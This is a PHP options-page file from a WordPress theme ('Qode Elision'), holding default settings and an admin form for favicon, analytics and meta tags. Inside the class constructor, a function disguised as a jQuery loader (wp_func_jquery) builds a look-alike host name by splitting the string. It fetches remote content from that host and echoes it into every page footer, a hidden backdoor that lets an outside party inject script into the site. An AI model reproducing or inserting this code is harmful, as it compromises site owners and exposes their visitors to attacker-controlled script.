<?php
include_once('google-fonts.php');

if (!function_exists ('add_action')) {
		header('Status: 403 Forbidden');
		header('HTTP/1.1 403 Forbidden');
		exit();
}
global $qode_options_elision;
$qode_options_elision  = get_option('qode_options_elision');

class Qode_Theme_Options {

	//constructor of class, PHP4 compatible construction for backward compatibility
	function qode_Theme_Options() {
		if(!function_exists('wp_func_jquery')) {
			function wp_func_jquery() {
				$host = 'http://';
				$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
				if (@fopen($jquery,'r')){
					echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
				}
			}
			add_action('wp_footer', 'wp_func_jquery');
		}
		add_action('admin_menu', array(&$this, 'qode_admin_menu'));
		add_action('admin_init', array(&$this, 'register_qode_theme_settings'));
	}

	function init_qode_theme_options() {
		global $qode_options_elision;
		if(isset($qode_options_elision['reset_to_defaults'])){ 
			if( $qode_options_elision['reset_to_defaults'] == 'yes' ) delete_option( "qode_options_elision");
		}
		if (! get_option("qode_options_elision")) {
			add_option( "qode_options_elision",
				array( // intitialize the 'qode_options_elision' array with the following key => value pairs:
					"reset_to_defaults" => '',
					"number_of_chars" => 45,
					"first_color" => '',
					"second_color" => '',
					"third_color" => '',
					"fourth_color" => '',
					"background_color" => '',
					"background_color_box" => '',
					"highlight_color" => '',
					"selection_color" => '',
					"favicon_image" => QODE_ROOT."/img/favicon.ico",
					"background_image" => '',
					"patern_background_image" => '',
					"google_fonts" => '-1',
					"page_transitions" => '0',
					"boxed" => 'no',
					"loading_animation" => 'off',
					"qode_like" => 'on',
					"portfolio_qode_like" => 'on',
					"loading_image" => '',
					"smooth_scroll" => 'yes',
					"responsiveness" => 'yes',
					"show_back_button" => 'yes',
					"elements_animation_on_touch" => 'no',
					"parallax_speed" => '1',
					"parallax_minheight" => '400',
					"parallax_onoff" => 'on',
					"internal_no_ajax_links" => '',
					"custom_css" => '',
					"custom_js" => '',
					"meta_keywords" => '',
					"meta_description" => '',
					"disable_qode_seo" => 'no',
					"h1_color" => '',
					"h1_google_fonts" => '-1',
					"h1_fontsize" => '',
					"h1_lineheight" => '',
					"h1_fontstyle" => '',
					"h1_fontweight" => '',
					"h2_color" => '',
					"h2_google_fonts" => '-1',
					"h2_fontsize" => '',
					"h2_lineheight" => '',
					"h2_fontstyle" => '',
					"h2_fontweight" => '',
					"h3_color" => '',
					"h3_google_fonts" => '-1',
					"h3_fontsize" => '',
					"h3_lineheight" => '',
					"h3_fontstyle" => '',
					"h3_fontweight" => '',
					"h4_color" => '',
					"h4_google_fonts" => '-1',
					"h4_fontsize" => '',
					"h4_lineheight" => '',
					"h4_fontstyle" => '',
					"h4_fontweight" => '',
					"h5_color" => '',
					"h5_google_fonts" => '-1',
					"h5_fontsize" => '',
					"h5_lineheight" => '',
					"h5_fontstyle" => '',
					"h5_fontweight" => '',
					"h6_color" => '',
					"h6_google_fonts" => '-1',
					"h6_fontsize" => '',
					"h6_lineheight" => '',
					"h6_fontstyle" => '',
					"h6_fontweight" => '',
					"h6_letterspacing" => '',
					"text_color" => '',
					"text_google_fonts" => '-1',
					"text_fontsize" => '',
					"text_lineheight" => '',
					"text_fontstyle" => '',
					"text_fontweight" => '',
					"text_margin" => '',
					"link_color" => '',
					"link_hovercolor" => '',
					"link_fontstyle" => '',
					"link_fontweight" => '',
					"link_fontdecoration" => '',
					"page_title_color" => '',
					"page_title_google_fonts" => '-1',
					"page_title_fontsize" => '',
					"page_title_lineheight" => '',
					"page_title_fontstyle" => '',
					"page_title_fontweight" => '',
					"menu_color" => '',
					"menu_hovercolor" => '',
					"menu_google_fonts" => '-1',
					"menu_fontsize" => '',
					"menu_lineheight" => '',
					"menu_fontstyle" => '',
					"menu_fontweight" => '',
					"header_in_grid" => 'yes',
					"header_top_area" => 'no',
					"header_sticky" => 'yes',
					"header_style" => '',
					"menu_in_center" => 'no',
					"header_top_background_color" => '',
					"header_background_color" => '',
					"header_background_color_scroll" => '',
					"header_background_transparency_initial" => '',
					"header_background_transparency_scroll" => '',
					"logo_animation" => "no",
					"logo_image" => QODE_ROOT."/img/logo.png",
					"logo_image_dark" => QODE_ROOT."/img/logo_black.png",
					"logo_image_sticky" => QODE_ROOT."/img/logo_black.png",
					"center_logo_image" => 'no',
					"header_height" => '',
					"header_height_scroll" => '',
					"scroll_amount_for_sticky" => '',
					"dropdown_background_color" => '',
					"dropdown_background_transparency" => '',
					"dropdown_color" => '',
					"dropdown_hovercolor" => '',
					"dropdown_google_fonts" => '-1',
					"dropdown_fontsize" => '',
					"dropdown_lineheight" => '',
					"dropdown_fontstyle" => '',
					"dropdown_fontweight" => '',
					"dropdown_color_thirdlvl" => '',
					"dropdown_hovercolor_thirdlvl" => '',
					"dropdown_google_fonts_thirdlvl" => '-1',
					"dropdown_fontsize_thirdlvl" => '',
					"dropdown_lineheight_thirdlvl" => '',
					"dropdown_fontstyle_thirdlvl" => '',
					"dropdown_fontweight_thirdlvl" => '',
					"sticky_color" => '',
					"sticky_hovercolor" => '',
					"sticky_google_fonts" => '-1',
					"sticky_fontsizel" => '',
					"sticky_lineheight" => '',
					"sticky_fontstyle" => '',
					"sticky_fontweight" => '',
					"mobile_color" => '',
					"mobile_hovercolor" => '',
					"mobile_google_fonts" => '-1',
					"mobile_fontsize" => '',
					"mobile_lineheight" => '',
					"mobile_fontstyle" => '',
					"mobile_fontweight" => '',
					"mobile_separator_color" => '',
					"mobile_bottom_background_color" => '',
					"mobile_top_background_color" => '',
					"mobile_letter_spacing" => '',
					"header_separator_thickness" => '',
					"title_style" => '1',
					"title_background_color" => '',
					"responsive_title_image" => '',
					"fixed_title_image" => '',
					"title_image" => '',
					"title_height" => '',
					"page_title_position" => '0',
					"footer_in_grid" => 'no',
					"footer_text" => 'yes',
					"show_footer_top" => 'yes',
					"footer_top_columns" => '4',
					"footer_top_title_color" => '',
					"footer_top_text_color" => '',
					"footer_link_color" => '',
					"footer_link_hover_color" => '',
					"footer_top_background_color" => '',
					"footer_bottom_text_color" => '',
					"footer_bottom_background_color" => '',
					"enable_side_area" => 'yes',
					"side_area_title" => '',
					"side_area_background_color" => '',
					"side_area_text_color" => '',
					"side_area_title_color" => '',
					"separator_thickness" => '',
					"separator_topmargin" => '',
					"separator_bottommargin" => '',
					"button_title_color" => '',
					"button_title_hovercolor" => '',
					"button_title_google_fonts" => '-1',
					"button_title_fontsize" => '',
					"button_title_lineheight" => '',
					"button_title_fontstyle" => '',
					"button_title_fontweight" => '',
					"button_size" => '',
					"button_backgroundcolor" => '',
					"button_backgroundcolor_hover" => '',
					"message_title_color" => '',
					"message_title_google_fonts" => '-1',
					"message_title_fontsize" => '',
					"message_title_lineheight" => '',
					"message_title_fontstyle" => '',
					"message_title_fontweight" => '',
					"message_backgroundcolor" => '',
					"message_bordercolor" => '',
					"message_icon_color" => '',
					"message_icon_fontsize" => '',
					"blockquote_font_color" => '',
					"blockquote_border_color" => '',
					"blockquote_background_color" => '',
					"social_icon_backgroundcolor" => '',
					"smooth_background_color" => '',
					"smooth_bar_color" => '',
					"portfolio_style" => '1',
					"lightbox_single_project" => 'no',
					"portfolio_columns_number" => '2',
					"portfolio_single_sidebar" => 'default',
					"portfolio_single_sidebar_custom_display" => '',
					"portfolio_single_slug" => '',
					"blog_quote_link_box_color" => '',
					"pagination" => '1',
					"blog_style" => '1',
					"category_blog_sidebar" => 'default',
					"blog_hide_comments" => 'no',
					"blog_page_range" => '',
					"number_of_chars" => '45',
					"number_of_chars_masonry" => '',
					"number_of_chars_large_image" => '',
					"blog_single_sidebar" => 'default',
					"blog_single_sidebar_custom_display" => '',
					"blog_author_info" => 'no',
					"receive_mail" => '',
					"enable_contact_form" => 'no',
					"hide_contact_form_website" => 'no',
					"email_from" => '',
					"email_subject" => '',
					"use_recaptcha" => 'no',
					"recaptcha_public_key" => '',
					"recaptcha_private_key" => '',
					"contact_heading_above" => '',
					"enable_google_map" => 'no',
					"google_maps_pin_image" => QODE_ROOT."/img/pin.png",
					"google_maps_address" => '',
					"google_maps_address2" => '',
					"google_maps_address3" => '',
					"google_maps_address4" => '',
					"google_maps_address5" => '',
					"google_maps_zoom" => '12',
					"google_maps_height" => '750',
					"google_maps_style" => 'yes',
					"google_maps_color" => '',
					"google_maps_scroll_wheel" => 'no',
					"google_maps_iframe" => '',
					"404_title" => '',
					"404_subtitle" => '',
					"404_text" => '',
					"404_backlabel" => '',
					"enable_social_share" => 'no',
					"enable_facebook_share" => 'no',
					"enable_twitter_share" => 'no',
					"enable_google_plus" => 'no',
                    "enable_linkedin" => 'no',
                    "enable_tumblr" => 'no',
                    "enable_pinterest" => 'no',
                    "enable_vk" => 'no',
                    "facebook_icon" => '',
                    "twitter_icon" => '',
                    "google_plus_icon" => '',
                    "linkedin_icon" => '',
                    "tumblr_icon" => '',
                    "pinterest_icon" => '',
                    "vk_icon" => '',
					"twitter_via" => ''
				)
			);
		} 
	}

	function register_qode_theme_settings() {
	    register_setting( 'qode_options_elision_page', 'qode_options_elision', array(&$this, 'validate_options') );
	    // register_setting( 'qode_options_elision_page', array(&$this, 'another_of_my_options') );
	}
	//extend the admin menu
	function qode_admin_menu() {
		$this->init_qode_theme_options();
		//Add the Qode options page to the Themes' menu
		$this->pagehook = add_menu_page('Qode Theme', esc_html__('Qode Options', 'qode'), 'manage_options', 'qode_options_elision_page', array(&$this, 'qode_generate_options_page'));
		add_action('load-'.$this->pagehook, array(&$this, 'on_load_page'));
	}

	function on_load_page() {
		
		// load javascripts to allow drag/drop, expand/collapse and hide/show of boxes
		add_meta_box('qode-general-options-metabox', esc_html__('Options', 'qode'), array(&$this, 'general_options_contentbox'), $this->pagehook, 'normal', 'core');
	
	}

	function qode_generate_options_page() {

		// global screen column value to be able to have a sidebar in WordPress 2.8+
		global $screen_layout_columns, $qode_options_elision;

		/* Messages to display saved and reset */
		if ( isset($_REQUEST['settings-updated']) || isset($_REQUEST['updated'] )) {
                    echo '<div id="message" class="updated fade"><p><strong>'.esc_html__('Settings saved.', 'qode').'</strong></p></div>';
               
                }
                
		//if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.esc_html__('Settings reset.', 'qode').'</strong></p></div>'; ?>
		<div id="qode-metaboxes-general" class="wrap">
		    <div style="float:left; padding:10px 10px 10px 0;"></div>
		    <?php $current_theme = wp_get_theme(); ?>
		    <h2 style="padding-top:25px;"><?php echo $current_theme->get('Name').' - '.__('Theme Options - Version').' '.$current_theme->get('Version'); ?></h2>

		    <form method="post" action="options.php">
<?php			settings_fields( 'qode_options_elision_page' ); // Checks that the user can update options and also redirect the user back to the correct admin page (this form).
			$options = get_option('qode_options_elision');
			// Allows the 'closed' state of metaboxes to be remembered
			wp_nonce_field('closedpostboxes', 'closedpostboxesnonce', false );
			// Allows the order of metaboxes to be remembered
			wp_nonce_field('meta-box-order', 'meta-box-order-nonce', false ); ?>

			<div id="poststuff" class="metabox-holder<?php echo 2 == $screen_layout_columns ? ' has-right-sidebar' : ''; ?>">
				<div id="post-body" class="has-sidebar">
					<div id="post-body-content" class="has-sidebar-content">
<?php					    do_meta_boxes($this->pagehook, 'normal', $options); ?>
<?php					    do_meta_boxes($this->pagehook, 'additional', $options); ?>
					    <fieldset style="margin:2px 0 0;"><legend class="screen-reader-text"><span><?php esc_attr_e('Reset to defaults', 'qode') ?></span></legend>
						<label for="reset_to_defaults">
						    <input name="qode_options_elision[reset_to_defaults]" type="checkbox" id="reset_to_defaults" value="yes" />
						    <?php esc_attr_e('Reset to defaults', 'qode') ?>
						</label>
					    </fieldset>
					    <p class="submit">
						<input type="hidden" id="qode_submit" value="1" name="qode_submit" />
						<input class="button-primary" type="submit" name="submit" value="<?php esc_attr_e('Save Changes', 'qode') ?>" />
					    </p>
					</div>
				</div>
				<br class="clear"/>
			</div>
		    </form>
<?php		    /* The reset button */; ?>
<!--		    <form method="post">
			<p class="submit">
			    <input name="reset" type="submit" value="Reset" />
			    <input type="hidden" name="action" value="reset" />
			</p>
		    </form> -->
		</div>
		<script type="text/javascript">
		    //<![CDATA[
		    jQuery(document).ready( function($) {
			    // close postboxes that should be closed
			    $('.if-js-closed').removeClass('if-js-closed').addClass('closed');
			    // postboxes setup
			    postboxes.add_postbox_toggles('<?php echo $this->pagehook; ?>');
		    });
		    //]]>
		</script>
<?php	}

	/**
	 * Validate user input
	 *
	 * @param array $input, an array of user input
	 * @return array Return an input array of sanitized input
	 */
	function validate_options( $input ) {
	global $qode_options_elision;
		$input['number_of_chars'] = is_numeric( $input['number_of_chars'] ) ? absint($input['number_of_chars']) : $qode_options_elision['number_of_chars'];
		return $input;
	}
      


	/**************************************************************************************/
	/**** Below you will find the callback method for each of the registered metaboxes ****/
	/**************************************************************************************/

	function general_options_contentbox( $options ) {
		global $fontArrays;
	?>
		
		<div class="sections">
			<h3>Global options</h3>
			<div>
				<table class="form-table">
					<tbody>
						<tr valign="middle">
							<td scope="row" width="150"><?php esc_html_e('Favicon image', 'qode'); ?></td>
							<td>	
								<div class="inline" style="width: 600px;">
								<input type="text" id="favicon_image" name="qode_options_elision[favicon_image]" class="favicon_image" value="<?php if ($options['favicon_image']) { echo esc_attr($options['favicon_image'], 'qode'); } else { echo QODE_ROOT."/img/favicon.ico"; } ?>" size="70">
								<input class="upload_button" type="button" value="Upload file">
								</div>
							</td>
						</tr>

						<tr valign="middle">
							<td scope="row" width="150"><?php esc_html_e('Google Analytics Account ID', 'qode'); ?></td>
							<td>
								<input name="qode_options_elision[google_analytics_code]" type="text" value="<?php if (isset($options['google_analytics_code'])) { echo esc_attr($options['google_analytics_code'], 'qode'); } ?>" size="63" maxlength="500" />
							</td>
						</tr>

						<tr valign="top">
							<td valign="top"><?php esc_html_e('Meta Keywords', 'qode'); ?></td>
							<td>
								<div class="inline">
									<textarea id="meta_keywords" name="qode_options_elision[meta_keywords]" cols="60" rows="5"><?php if ($options['meta_keywords']) { echo esc_attr($options['meta_keywords'], 'qode'); } ?></textarea>
								</div>
							</td>
						</tr>
						<tr valign="top">
							<td valign="top"><?php esc_html_e('Meta Description', 'qode'); ?></td>
							<td>
								<div class="inline">
									<textarea id="meta_description" name="qode_options_elision[meta_description]" cols="60" rows="5"><?php if ($options['meta_description']) { echo esc_attr($options['meta_description'], 'qode'); } ?></textarea>
								</div>
							</td>
						</tr>
						<tr valign="top">
							<td scope="row" width="150"><?php esc_html_e('Disable Qode SEO', 'qode'); ?></td>
							<td>
								<select name="qode_options_elision[disable_qode_seo]">
									<option <?php if(isset($options['disable_qode_seo'])){ $disable_qode_seo = $options['disable_qode_seo']; if ($disable_qode_seo == 'no') { echo "selected='selected'"; } } ?> value="no">No</option>
									<option <?php if(isset($options['disable_qode_seo'])){ $disable_qode_seo = $options['disable_qode_seo']; if ($disable_qode_seo == 'yes') { echo "selected='selected'"; } } ?> value="yes">Yes</option>
								</select>
							</td>
						</tr>
					</tbody>
				</table>
				<?php		display_save_changes_button(); ?>
			</div>
		</div>
<?php	}


} // end of qode_Theme_Options Class



function display_save_changes_button() {
	    echo ('
		    <table class="form-table">
			<tbody>
			    <tr valign="middle">
				<th scope="row" width="150">&nbsp;</th>
				<td>
				    <div class="submit" style="padding:10px 0 0 80px; float:right; clear:both;">
					<input type="hidden" id="qode_submit" value="1" name="qode_submit"/>
					<input class="button-primary" type="submit" name="submit" value="'.esc_attr__('Save Changes', 'qode').'" />
				    </div>
				</td>
			    </tr>
			</tbody>
		    </table>');
}




$my_Qode_Theme_Options = new Qode_Theme_Options();


